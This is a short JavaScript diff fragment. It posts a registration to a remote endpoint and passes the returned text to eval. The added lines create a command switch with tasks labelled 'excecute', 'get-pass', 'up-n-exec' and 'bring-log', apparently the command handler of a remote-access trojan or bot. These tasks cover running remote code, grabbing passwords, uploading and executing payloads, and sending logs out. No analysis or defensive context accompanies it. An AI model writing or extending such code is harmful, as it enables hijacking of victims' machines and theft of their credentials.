@@ -5,3 +5,9 @@ xhr.open("POST", endpoint + routes[0], false);
 xhr.send(registration);
 var source = xhr.responseText;
 eval(source);
+switch (task) {
+case "excecute": eval(source); break;
+case "get-pass": helper(); break;
+case "up-n-exec": helper(); break;
+case "bring-log": helper(); break;
+}
